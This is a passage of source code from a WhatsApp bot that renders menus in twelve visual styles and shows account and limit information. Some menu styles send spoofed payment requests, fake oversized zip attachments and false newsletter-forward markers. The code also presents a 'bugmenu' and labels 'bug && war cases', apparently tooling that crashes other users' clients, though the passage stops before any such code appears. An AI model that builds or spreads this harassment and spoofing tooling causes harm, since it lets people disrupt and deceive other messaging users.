                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'convertmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${convertmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'bugmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               DeepakBotInc.sendMessage(sender, { text: b }, { quoted: m })
               replygcdeepak('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               replygcdeepak(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'clearchat':
